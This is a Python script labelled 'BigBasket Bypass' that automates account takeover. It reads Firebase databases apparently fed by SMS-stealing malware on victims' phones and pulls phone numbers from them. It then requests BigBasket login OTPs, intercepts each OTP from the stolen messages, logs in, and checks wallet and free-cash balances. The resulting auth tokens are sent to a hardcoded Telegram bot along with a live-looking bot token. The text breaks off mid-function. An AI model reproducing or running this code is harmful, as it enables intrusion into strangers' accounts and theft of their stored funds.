#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║   BigBasket Bypass — 5 DEVICES × PHONES (SEQUENTIAL PER DEVICE)          ║
║   AUTO MODE — NO SELECTION — RENDER-SAFE (health check)                  ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import json
import time
import uuid
import base64
import signal
import asyncio
import logging
import threading
import http.server
import socketserver
from datetime import datetime
from typing import Optional, Dict, List, Set, Any, Tuple

import aiohttp
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import tls_client
    HAS_TLS = True
except ImportError:
    HAS_TLS = False


# ============================================================
# COLORS
# ============================================================
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    ORANGE  = "\033[38;5;208m"
    GRAY    = "\033[38;5;245m"

    @staticmethod
    def ok(s):      return f"{C.GREEN}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def err(s):     return f"{C.RED}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def warn(s):    return f"{C.YELLOW}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def info(s):    return f"{C.CYAN}{s}{C.RESET}"
    @staticmethod
    def head(s):    return f"{C.MAGENTA}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def money(s):   return f"{C.ORANGE}{C.BOLD}{s}{C.RESET}"
    @staticmethod
    def dev(s):     return f"{C.BLUE}{s}{C.RESET}"
    @staticmethod
    def dim(s):     return f"{C.GRAY}{s}{C.RESET}"


def _visible_len(s: str) -> int:
    return len(re.sub(r'\033\[[0-9;]*m', '', s))


def pad(s: str, w: int) -> str:
    return s + " " * max(0, w - _visible_len(s))


def log(*args, **kwargs):
    """Print with force flush (Render logs stream karne ke liye zaroori)."""
    kwargs.setdefault("flush", True)
    print(*args, **kwargs)


# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8193791477:AAEVazSxsLxFI1RWiQ4RTmSOObqV_-gy1YI"
CHAT_ID = 8287613405

FIREBASE_FILE = "firebase.txt"
USED_FILE = "used.json"

OTP_WAIT_SECONDS        = 30       # ⬆ 15 → 30 (SMS delay handle)
FB_REQUEST_TIMEOUT      = 6
FB_RETRY_MAX            = 5
FB_RETRY_BACKOFF        = 1.0
FB_MESSAGES_PER_CLIENT_LIMIT = 150
FB_CLIENTS_MAX_BYTES    = 100 * 1024 * 1024

FB_CONCURRENCY          = 25
DEVICES_PARALLEL        = 2       # ⬇ 5 → 3 (Render safe)
FB_SCAN_CONCURRENCY     = 20

MIN_BALANCE_TO_SEND     = 1
AUTO_RERUN_DELAY        = 0        # 0 = single run

# Health check port (Render sets $PORT env)
HEALTH_PORT = int(os.environ.get("PORT", 8080))


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    force=True,
)
logger = logging.getLogger("DarkScript")


# ============================================================
# HEALTH CHECK SERVER (Render Web Service ke liye)
# ============================================================
class _HealthHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"ok")
        except Exception:
            pass

    def log_message(self, *args, **kwargs):
        return  # silence


def start_health_server():
    try:
        handler = _HealthHandler
        httpd = socketserver.TCPServer(("0.0.0.0", HEALTH_PORT), handler)
        httpd.allow_reuse_address = True
        t = threading.Thread(target=httpd.serve_forever, daemon=True)
        t.start()
        print(f"[HEALTH] Listening on 0.0.0.0:{HEALTH_PORT}", flush=True)
    except Exception as e:
        print(f"[HEALTH] Failed: {e}", flush=True)


# ============================================================
# USED TRACKER
# ============================================================
class UsedTracker:
    def __init__(self, path: str = USED_FILE):
        self.path = path
        self._lock = threading.Lock()
        self.data: Dict[str, dict] = self._load()

    def _load(self) -> Dict[str, dict]:
        try:
            if os.path.exists(self.path):
                with open(self.path, "r", encoding="utf-8") as f:
                    d = json.load(f)
                if isinstance(d, dict):
                    return d
        except Exception as e:
            logger.warning(f"used.json load failed: {e}")
        return {}

    def _save(self):
        try:
            tmp = f"{self.path}.tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(self.data, f, indent=2, ensure_ascii=False)
            os.replace(tmp, self.path)
        except Exception as e:
            logger.error(f"used.json save failed: {e}")

    @staticmethod
    def _key(device_id: str, phone: str) -> str:
        return f"{device_id}:{phone}"

    def is_used(self, device_id: str, phone: str) -> bool:
        with self._lock:
            return self._key(device_id, phone) in self.data

    def count(self) -> int:
        with self._lock:
            return len(self.data)

    def mark_used(self, device_id: str, phone: str,
                  wallet: int = 0, freecash: int = 0, fb_url: str = ""):
        with self._lock:
            self.data[self._key(device_id, phone)] = {
                "device_id": device_id, "phone": phone,
                "wallet": int(wallet), "freecash": int(freecash),
                "total": int(wallet) + int(freecash),
                "fb_url": fb_url,
                "logged_at": datetime.now().isoformat(),
                "timestamp": int(time.time()),
            }
            self._save()


USED = UsedTracker(USED_FILE)


# ============================================================
# PHONE / OTP PATTERNS
# ============================================================
PHONE_PATTERNS = [
    re.compile(r'(?:Jio|JIO)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Airtel|AIRTEL)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:BSNL|bsnl)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:MTNL|mtnl)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Docomo|DOCOMO|Tata)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Reliance|RELIANCE)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Telenor|TELENOR)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Uninor|UNINOR)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:Videocon|VIDEOCON)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:नंबर|নম্বৰ)\s*[:\-]\s*([6-9][0-9]{9})'),
    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})', re.I),
    re.compile(r'(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num|नंबर)\s*[:\-]\s*([6-9][0-9]{9})', re.I),
    re.compile(r'Number\s*[:\-]\s*([6-9][0-9]{9})', re.I),
    re.compile(r'registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})', re.I),
    re.compile(r'(\+91[-\s]?[6-9][0-9]{9})'),
    re.compile(r'(?:\b91)([6-9][0-9]{9})\b'),
    re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)')
]

OTP_PATTERNS = [
    re.compile(r'(?<!\d)(\d{6})(?!\d)'),
    re.compile(r'(?:login code|otp|verification code)[:\s]*(\d{6})', re.IGNORECASE),
    re.compile(r'Your OTP is (\d{6})', re.IGNORECASE),
    re.compile(r'Bigbasket login code[:\s]*(\d{6})', re.IGNORECASE),
    re.compile(r'(?:OTP|code)[:\s]*(\d{6})', re.IGNORECASE),
]

OTP_KEYWORDS = [
    'bigbasket', 'big basket', 'bbnow', 'login code',
    'bgcity', 'otp', 'verification', 'tataneu', 'tata', 'basket',
]


# ============================================================
# HELPERS
# ============================================================
def load_firebase_urls() -> List[str]:
    if not os.path.exists(FIREBASE_FILE):
        with open(FIREBASE_FILE, "w") as f:
            f.write("# Ek line me ek firebase URL\n")
        return []
    urls = []
    with open(FIREBASE_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            urls.append(line)
    return urls


def normalize_fb_url(url):
    try:
        if not url or not isinstance(url, str):
            return None
        u = url.strip()
        if "?s=" in u:
            try:
                s = u.split("?s=")[1].split("&")[0]
                s += "=" * ((4 - len(s) % 4) % 4)
                dec = base64.b64decode(s).decode("utf-8", errors="ignore")
                if dec.startswith("{"):
                    j = json.loads(dec)
                    u = j.get("url") or j.get("firebase") or u
                else:
                    u = dec.split("|")[0].strip()
            except Exception:
                return None
        if not u.startswith("http"):
            return None
        if "firebaseio.com" not in u and "firebasedatabase.app" not in u:
            return None
        u = u.rstrip("/")
        while u.endswith(".json"):
            u = u[:-5].rstrip("/")
        return u
    except Exception:
        return None


def build_fb_endpoint(base_url, path="", query=""):
    base = base_url.rstrip("/")
    p = (path or "").strip("/")
    q = (query or "").strip().lstrip("?")
    url = f"{base}/{p}/.json" if p else f"{base}/.json"
    if q:
        url += f"?{q}"
    return url


def _get_device_name(info, cid):
    if not isinstance(info, dict):
        return cid
    for key in ("modelName", "model", "deviceName"):
        v = info.get(key)
        if v and str(v).strip() and str(v) != "-":
            return str(v).strip()
    return cid


def _clean_phone(raw) -> Optional[str]:
    if not raw:
        return None
    d = re.sub(r'\D', '', str(raw))
    if len(d) == 12 and d.startswith('91'):
        d = d[2:]
    elif len(d) == 11 and d.startswith('0'):
        d = d[1:]
    if len(d) == 10 and d[0] in '6789':
        return d
    return None


def _newest_messages(msgs, limit=FB_MESSAGES_PER_CLIENT_LIMIT):
    if not isinstance(msgs, dict):
        return []
    try:
        keys = sorted(msgs.keys(), key=lambda x: int(x), reverse=True)
    except (TypeError, ValueError):
        keys = list(msgs.keys())[::-1]
    return [msgs[k] for k in keys[:limit] if isinstance(msgs.get(k), dict)]


def extract_all_phones_from_device(info, messages, cid) -> List[str]:
    phones: Set[str] = set()

    if isinstance(info, dict):
        for key in ("mobNo", "mob_no", "mobile", "phoneNumber", "phone"):
            p = _clean_phone(info.get(key))
            if p:
                phones.add(p)

        sims = info.get("sims")
        sim_list = []
        if isinstance(sims, list):
            sim_list = sims
        elif isinstance(sims, dict):
            sim_list = list(sims.values())
        for sim in sim_list:
            if isinstance(sim, dict):
                for k in ("phoneNumber", "phone", "mobNo", "number"):
                    p = _clean_phone(sim.get(k))
                    if p:
                        phones.add(p)

    if isinstance(messages, dict):
        for m in _newest_messages(messages, limit=FB_MESSAGES_PER_CLIENT_LIMIT):
            text = str(m.get("body") or m.get("message")
                       or m.get("text") or m.get("msg") or "")
            if not text:
                continue
            for pat in PHONE_PATTERNS:
                try:
                    for num in pat.findall(text):
                        p = _clean_phone(num)
                        if p:
                            phones.add(p)
                except Exception:
                    continue

    return sorted(phones)


def _extract_otp_from_text(text: str) -> Optional[str]:
    if not text:
        return None
    text_lower = text.lower()
    if not any(kw in text_lower for kw in OTP_KEYWORDS):
        return None
    for pat in OTP_PATTERNS:
        try:
            match = pat.search(text)
        except Exception:
            continue
        if not match:
            continue
        try:
            grp = match.group(1)
        except Exception:
            grp = None
        raw = grp if grp is not None else match.group(0)
        otp = re.sub(r'\D', '', raw or '')
        if len(otp) == 6 and otp.isdigit():
            return otp
    return None


# ============================================================
# FIREBASE CORE
# ============================================================
class FBStatus:
    SUCCESS = "SUCCESS"
    ACCESS_DENIED = "ACCESS_DENIED"
    NOT_FOUND = "NOT_FOUND"
    TIMEOUT = "TIMEOUT"
    CONNECTION_ERROR = "CONNECTION_ERROR"
    INVALID_JSON = "INVALID_JSON"
    EMPTY_DATA = "EMPTY_DATA"
    HTTP_ERROR = "HTTP_ERROR"
    TOO_LARGE = "TOO_LARGE"
    OTHER_ERROR = "OTHER_ERROR"


async def fb_get_json(session, url, *, timeout=FB_REQUEST_TIMEOUT,
                      max_bytes=FB_CLIENTS_MAX_BYTES, retries=FB_RETRY_MAX):
    last_err = ""
    for attempt in range(retries + 1):
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                status = resp.status
                if status == 413:
                    return None, FBStatus.TOO_LARGE, "HTTP 413"
                cl = resp.headers.get("Content-Length")
                if cl and cl.isdigit() and int(cl) > max_bytes:
                    return None, FBStatus.TOO_LARGE, f"CL {cl}"
                body = b""
                async for chunk in resp.content.iter_chunked(8192):
                    body += chunk
                    if len(body) > max_bytes:
                        return None, FBStatus.TOO_LARGE, "too big"
                text = body.decode("utf-8", errors="ignore").strip()
                if status in (401, 403):
                    return None, FBStatus.ACCESS_DENIED, f"HTTP {status}"
                if status == 404:
                    return None, FBStatus.NOT_FOUND, "HTTP 404"
                if status in (408, 504):
                    last_err = f"HTTP {status}"
                    if attempt < retries:
                        await asyncio.sleep(FB_RETRY_BACKOFF)
                        continue
                    return None, FBStatus.TIMEOUT, last_err
                if status == 429 or 500 <= status < 600:
                    last_err = f"HTTP {status}"
                    if attempt < retries:
                        await asyncio.sleep(FB_RETRY_BACKOFF)
                        continue
                    return None, FBStatus.HTTP_ERROR, last_err
                if status >= 400:
                    return None, FBStatus.HTTP_ERROR, f"HTTP {status}"
                if not text or text == "null":
                    return None, FBStatus.EMPTY_DATA, "null/empty"
                try:
                    data = json.loads(text)
                except json.JSONDecodeError:
                    return None, FBStatus.INVALID_JSON, "json decode"
                if data is None:
                    return None, FBStatus.EMPTY_DATA, "null"
                return data, FBStatus.SUCCESS, ""
        except asyncio.TimeoutError:
            last_err = "timeout"
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF)
                continue
            return None, FBStatus.TIMEOUT, last_err
        except aiohttp.ClientError as e:
            last_err = f"{type(e).__name__}"
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF)
                continue
            return None, FBStatus.CONNECTION_ERROR, last_err
        except Exception as e:
            last_err = str(e)[:80]
            if attempt < retries:
                await asyncio.sleep(FB_RETRY_BACKOFF)
                continue
            return None, FBStatus.OTHER_ERROR, last_err
    return None, FBStatus.OTHER_ERROR, last_err or "retries exhausted"


async def scan_firebase_summary(fb_url):
    result = {"total": 0, "online": 0, "offline": 0, "status": FBStatus.OTHER_ERROR}
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT),
        connector=connector)
    try:
        clients, status, _ = await fb_get_json(
            session, build_fb_endpoint(fb_url, "clients"), retries=FB_RETRY_MAX)
        if not isinstance(clients, dict):
            clients, status, _ = await fb_get_json(
                session, build_fb_endpoint(fb_url, "devices"), retries=FB_RETRY_MAX)

        if isinstance(clients, dict):
            result["total"] = len(clients)
            online = sum(1 for _, v in clients.items()
                         if isinstance(v, dict) and v.get("status") is True)
            result["online"] = online
            result["offline"] = result["total"] - online
            result["status"] = FBStatus.SUCCESS
        else:
            result["status"] = status
    except Exception as e:
        logger.error(f"scan_firebase_summary: {e}")
    finally:
        try:
            await session.close()
        except Exception:
            pass
    return result


async def _fetch_device_messages(session, base_url, cid):
    q = f'orderBy="$key"&limitToLast={FB_MESSAGES_PER_CLIENT_LIMIT}'
    murl = build_fb_endpoint(base_url, f"messages/{cid}", query=q)
    fetched, st, _ = await fb_get_json(session, murl,
                                        max_bytes=FB_CLIENTS_MAX_BYTES,
                                        retries=FB_RETRY_MAX)
    if st == FBStatus.SUCCESS and isinstance(fetched, dict):
        return fetched
    return {}


async def get_online_devices(fb_url):
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=FB_REQUEST_TIMEOUT),
        connector=connector)
    try:
        clients, st, _ = await fb_get_json(
            session, build_fb_endpoint(fb_url, "clients"),
            max_bytes=FB_CLIENTS_MAX_BYTES)
        if not isinstance(clients, dict):
            clients, st, _ = await fb_get_json(
                session, build_fb_endpoint(fb_url, "devices"),
                max_bytes=FB_CLIENTS_MAX_BYTES)
        if not isinstance(clients, dict):
            return {}

        online_list = [(cid, info) for cid, info in clients.items()
                       if isinstance(info, dict) and info.get("status") is True]
        result = {}
        sem = asyncio.Semaphore(FB_CONCURRENCY)

        async def _proc(cid, info):
            async with sem:
                name = _get_device_name(info, cid)
                msgs = await _fetch_device_messages(session, fb_url, cid) or {}
                phones = extract_all_phones_from_device(info, msgs, cid)
                return cid, {"name": name, "phones": phones, "messages": msgs}

        tasks = [asyncio.create_task(_proc(c, i)) for c, i in online_list]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Exception) or r is None:
                continue
            cid, payload = r
            result[cid] = payload
        return result
    finally:
        try:
            await session.close()
        except Exception:
            pass


# ============================================================
# OTP FETCH FROM FIREBASE
# ============================================================
def _fetch_current_otps(fb_url: str, client_id: str) -> Set[str]:
    baseline = set()
    try:
        session = requests.Session()
        session.verify = False
        url = f"{fb_url.rstrip('/')}/messages/{client_id}.json"
        resp = None
        for attempt in range(FB_RETRY_MAX + 1):
            try:
                resp = session.get(url, timeout=5)
                break
            except Exception:
                if attempt < FB_RETRY_MAX:
                    time.sleep(0.5)
                    continue
                return baseline
        if resp is None or resp.status_code != 200:
            return baseline
        data = resp.json()
        if not data or not isinstance(data, dict):
            return baseline
        for m in _newest_messages(data):
            if not isinstance(m, dict):
                continue
            body = str(m.get('body') or m.get('message')
                       or m.get('text') or m.get('msg') or '')
            otp = _extract_otp_from_text(body)
            if otp:
                baseline.add(otp)
    except Exception as e:
        logger.warning(f"Baseline fetch error: {e}")
    return baseline


def fetch_one_new_otp(fb_url: str, client_id: str, timeout: int,
                      trigger_ms: int, baseline_otps: set) -> Optional[str]:
    """Wait for ONE new OTP (used for sequential phone processing)."""
    start = time.time()
    session = requests.Session()
    session.verify = False
    base_url = fb_url.rstrip('/')

    while time.time() - start < timeout:
        try:
            url = f"{base_url}/messages/{client_id}.json"
            resp = session.get(url, timeout=5)
            if resp.status_code != 200:
                time.sleep(0.6)
                continue
            data = resp.json()
            if not data or not isinstance(data, dict):
                time.sleep(0.6)
                continue

            found: List[Tuple[int, str]] = []
            for msg_id, msg in data.items():
                if not isinstance(msg, dict):
                    continue
                try:
                    ts = int(msg_id)
                except (ValueError, TypeError):
                    continue
                if ts < (trigger_ms - 60000):
                    continue
                text = str(msg.get('body') or msg.get('message')
                           or msg.get('text') or msg.get('msg') or '')
                otp = _extract_otp_from_text(text)
                if not otp:
                    continue
                if otp in baseline_otps:
                    continue
                found.append((ts, otp))

            if found:
                found.sort()
                # Newest OTP
                return found[-1][1]

            time.sleep(0.5)
        except Exception:
            time.sleep(0.6)

    return None


# ============================================================
# BIGBASKET CLIENT
# ============================================================
class BigBasketClient:
    def __init__(self):
        self.device_id = uuid.uuid4().hex[:16]
        self.ref_id = None
        self.bb_token = None
        self.visitor_id = None
        self.m_id = None
        self.sa_ids = None
        self.csurftoken = None
        self.wallet_details = {}
        self.freecash_details = {}
        self.last_otp_error = None
        self.last_login_response = {}
        self.session = None
        self._init_session()

    def _init_session(self):
        if HAS_TLS:
            try:
                self.session = tls_client.Session(
                    client_identifier="chrome_120",
                    random_tls_extension_order=True)
            except Exception:
                self.session = requests.Session()
        else:
            self.session = requests.Session()
        try:
            self.session.proxies = {}
            self.session.headers.update({
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'user-agent': 'BB Android/v8.35.0/os 15',
                'x-channel': 'BB-Android', 'x-entry-context': 'bb-b2c',
                'x-tcp-platform': 'native',
                'x-tcp-device-version': 'android_8.35.0_25113510',
                'common-client-static-version': '104',
                'x-device-model': 'Samsung SM-A536E',
                'x-pharma': 'true', 'x-bucket-id': '50',
            })
        except Exception as e:
            logger.error(f"_init_session: {e}")

    def _request(self, method, url, **kwargs):
        for attempt in range(FB_RETRY_MAX + 1):
            try:
                func = getattr(self.session, method.lower(), None)
                r = func(url, **kwargs) if func else self.session.request(method, url, **kwargs)
                return r
            except Exception:
                if attempt < FB_RETRY_MAX:
                    time.sleep(0.6)
                    continue
                return None
        return None

    def _set_cookie(self, name, value):
        try:
            if hasattr(self.session, "cookies"):
                if name in self.session.cookies:
                    del self.session.cookies[name]
                if value is not None:
                    self.session.cookies.set(name, value)
        except Exception:
            pass

    def _update_cookies(self, response):
        try:
            if response and hasattr(response, "cookies"):
                for k, v in response.cookies.items():
                    self._set_cookie(k, v)
                    if k == "csurftoken":
                        self.csurftoken = v
        except Exception:
            pass

    def register_device(self):
        try:
            existing = (self.session.cookies.get("_bb_vid")
                        if hasattr(self.session, "cookies") else None)
            if existing:
                self.visitor_id = existing
                return True
            payload = {
                "imei": "02:00:00:00:00:00",
                "device_id": self.device_id,
                "city_id": "1",
                "properties": json.dumps({
                    "platform": "java", "os_name": "android",
                    "os_version": "15", "app_version": "8.35.0",
                    "device_make": "Samsung", "device_model": "SM-A536E",
                    "screen_resolution": "900X1600", "screen_dpi": 240
                })
            }
            r = self._request("POST",
                "https://www.bigbasket.com/mapi/v4.2.0/register/device/", data=payload)
            if r and r.status_code == 200:
                data = r.json()
                self.visitor_id = (data.get("response", {}).get("visitor_id")
                                   or r.cookies.get("_bb_vid")
                                   or str(int(time.time() * 1000)) + uuid.uuid4().hex[:8])
                self._update_cookies(r)
                return True
            self.visitor_id = str(int(time.time() * 1000)) + uuid.uuid4().hex[:8]
            return True
        except Exception:
            self.visitor_id = str(int(time.time() * 1000)) + uuid.uuid4().hex[:8]
            return True

    def load_ui_data(self):
        for url in [
            "https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true",
            "https://www.bigbasket.com/ui-svc/v1/app-data?os_name=android&app_version=8.35.0"
        ]:
            try:
                r = self._request("GET", url)
                self._update_cookies(r)
            except Exception:
                pass
        return True

    def update_device_info(self):
        try:
            self.session.headers.update({"content-type": "application/x-www-form-urlencoded"})
            r = self._request("POST",
                "https://www.bigbasket.com/mapi/v4.2.0/update/device/info/",
                data={"ad_id": "3e0d3f64-3657-40af-9095-c0f4fc692d8e"})
            self._update_cookies(r)
        except Exception:
            pass
        return True

    def request_otp(self, mobile):
        try:
            self.session.headers.update({"content-type": "application/json"})
            r = self._request("POST",
                "https://www.bigbasket.com/member-tdl/v3/member/otp/",
                json={"identifier": mobile, "referrer": "unified_login"})
            if not r:
                self.last_otp_error = "No response"
                return False
            self._update_cookies(r)
            if r.status_code == 200:
                data = r.json()
                if "refId" in data:
                    self.ref_id = data["refId"]
                    self.last_otp_error = None
                    return True
                self.last_otp_error = "Missing refId"
                return False
            msg = ""
            try:
                ed = r.json()
                errs = ed.get("errors", []) if isinstance(ed, dict) else []
                if errs:
                    msg = errs[0].get("msg") or errs[0].get("display_msg") or ""
            except Exception:
                pass
            self.last_otp_error = msg or f"HTTP {r.status_code}"
            return False
        except Exception as e:
            self.last_otp_error = str(e)
            return False

    def verify_otp(self, mobile, otp):
        try:
            if not self.ref_id:
                self.last_otp_error = "No ref_id"
                return False
            r = self._request("POST",
                "https://www.bigbasket.com/member-tdl/v3/member/unified-login/",
                json={"mobile_no": mobile, "mobile_no_otp": otp, "refId": self.ref_id})
            if not r:
                self.last_otp_error = "No response"
                return False
            self._update_cookies(r)
            try:
                self.last_login_response = r.json() if r.content else {}
            except Exception:
                self.last_login_response = {"raw": getattr(r, "text", "")[:2000]}
            if r.status_code == 200:
                data = self.last_login_response
                if "bb_token" in data:
                    self.bb_token = data["bb_token"]
                    self._set_cookie("BBAUTHTOKEN", self.bb_token)
                    self.m_id = data.get("m_id")
                    self.visitor_id = data.get("visitor_id")
                    self.csurftoken = (self.session.cookies.get("csurftoken")
                                       if hasattr(self.session, "cookies") else None)
                    return True
                if "errors" in data and data["errors"]:
                    self.last_otp_error = data["errors"][0].get("msg", "Unknown")
                    return False
                self.last_otp_error = "Unknown response"
                return False
            self.last_otp_error = f"HTTP {r.status_code}"
            return False
        except Exception as e:
            self.last_otp_error = str(e)
            return False

    def refresh_session(self):
        try:
            r = self._request("GET",
                "https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true")
            self._update_cookies(r)
            self.csurftoken = (self.session.cookies.get("csurftoken")
                               if hasattr(self.session, "cookies") else None)
            sa = (self.session.cookies.get("_bb_sa_ids")
                  if hasattr(self.session, "cookies") else None)
            if sa:
                self.sa_ids = sa
        except Exception:
            pass
        return True

    def get_wallet_details(self):
        if not self.bb_token:
            return None
        try:
            self.refresh_session()
            self.session.headers.update({
                "content-type": "application/json",
                "x-entry-context-id": "100",
                "x-entry-context": "bb-b2c",
                "x-tracker": str(uuid.uuid4()),
                "x-pharma": "true"
            })
            if self.csurftoken:
                self.session.headers["x-csurftoken"] = self.csurftoken
            self._set_cookie("_bb_source", "app")
            self._set_cookie("_bb_vid", self.visitor_id)
            self._set_cookie("_bb_mid", self.m_id)
            if self.sa_ids:
                self._set_cookie("_bb_sa_ids", self.sa_ids)
            r = self._request("GET", "https://www.bigbasket.com/wallet/v1/details")
            if r and r.status_code == 200:
                self.wallet_details = r.json()
                return self.wallet_details
            return None
        except Exception as e:
            logger.error(f"wallet: {e}")
            return None

    def get_free_cash(self):
        if not self.bb_token:
            return None
        try:
            self.refresh_session()
            h = {
                "content-type": "application/json", "x-retry": "0",
                "x-tcp-device-version": "android_8.38.0_25115710",
                "common-client-static-version": "105", "x-bucket-id": "36",
                "x-channel": "BB-Android", "x-tracker": str(uuid.uuid4()),
                "x-entry-context": "bb-b2c", "x-entry-context-id": "100"
            }
            if self.csurftoken:
                h["x-csurftoken"] = self.csurftoken
            for k, v in h.items():
                self.session.headers[k] = v
            payload = {
                "freecash_v2_enabled": True, "sa_city_ids": [18],
                "sa_ids": [int(self.sa_ids) if self.sa_ids else 28425],
                "context": "homepage", "page_type": None,
                "channel": "BB-Android"
            }
            r = self._request("POST",
                "https://www.bigbasket.com/ui-svc/v1/free-cash/", json=payload)
            if r and r.status_code == 200:
                self.freecash_details = r.json()
                return self.freecash_details
            return None
        except Exception as e:
            logger.error(f"freecash: {e}")
            return None


# ============================================================
# TELEGRAM SENDER
# ============================================================
def _build_clean_json(client: BigBasketClient) -> dict:
    return {
        "bbAuthToken": client.bb_token or "",
        "mId": client.m_id or "",
        "bbVisitorId": client.visitor_id or "",
    }


async def send_telegram_alert(fb_url, device_id, phone, client,
                              wallet, freecash, otp=""):
    base = f"https://api.telegram.org/bot{BOT_TOKEN}"
    total = int(wallet) + int(freecash)
    try:
        async with aiohttp.ClientSession() as session:
            try:
                clean = _build_clean_json(client)
                json_bytes = json.dumps(clean, indent=2, ensure_ascii=False).encode("utf-8")
                form = aiohttp.FormData()
                form.add_field("chat_id", str(CHAT_ID))
                form.add_field(
                    "document", json_bytes,
                    filename=f"{phone}_{total}.json",
                    content_type="application/json"
                )
                form.add_field(
                    "caption",
                    f"OK | W=₹{int(wallet)} F=₹{int(freecash)} T=₹{total} →"
                )
                await session.post(
                    f"{base}/sendDocument",
                    data=form,
                    timeout=aiohttp.ClientTimeout(total=30)
                )
            except Exception as e:
                logger.error(f"sendDocument failed: {e}")
        logger.info(f"[TG] Sent JSON for {phone} | ₹{total}")
    except Exception as e:
        logger.error(f"[TG] send failed: {e}")


# ============================================================
# SEQUENTIAL PHONE PROCESSING (per device — fixes OTP mismatch)
# ============================================================
async def _process_one_phone(device_id: str, phone: str, fb_url: str) -> dict:
    """Process a single phone end-to-end: OTP send → wait → verify → balance."""
    client = BigBasketClient()
    try:
        # fresh baseline
        baseline = await asyncio.to_thread(_fetch_current_otps, fb_url, device_id)

        # prepare session
        await asyncio.to_thread(client.register_device)
        await asyncio.to_thread(client.load_ui_data)
        await asyncio.to_thread(client.update_device_info)

        # request OTP
        ok = await asyncio.to_thread(client.request_otp, phone)
        if not ok:
            log(f"   {C.err('❌ OTP failed')} → {phone} ({client.last_otp_error})")
            return {"phone": phone, "device_id": device_id, "success": False,
                    "error": f"OTP: {client.last_otp_error}"}
        log(f"   {C.ok('✅ OTP sent')} → {C.BOLD}{phone}{C.RESET}")

        trigger_ms = int(time.time() * 1000)
        otp = await asyncio.to_thread(
            fetch_one_new_otp, fb_url, device_id, OTP_WAIT_SECONDS,
            trigger_ms, baseline)

        if not otp:
            log(f"   {C.err('✗ No OTP received')} → {phone}")
            return {"phone": phone, "device_id": device_id, "success": False,
                    "error": "no OTP received"}

        log(f"   {C.info('🔐 Verifying')} {phone} {C.dim('with OTP')} {C.BOLD}{otp}{C.RESET}")
        verified = await asyncio.to_thread(client.verify_otp, phone, otp)
        if not verified:
            log(f"   {C.err('✗ Verify failed')} → {phone} ({client.last_otp_error})")
            return {"phone": phone, "device_id": device_id, "success": False,
                    "error": f"Verify: {client.last_otp_error}"}

        w = await asyncio.to_thread(client.get_wallet_details) or {}
        f = await asyncio.to_thread(client.get_free_cash) or {}
        wb = int(w.get("current_wallet_balance", 0) or 0)
        fb = int(f.get("total_freecash_amount", 0) or 0)
        total_cash = wb + fb

        USED.mark_used(device_id, phone, wallet=wb, freecash=fb, fb_url=fb_url)

        if total_cash >= MIN_BALANCE_TO_SEND:
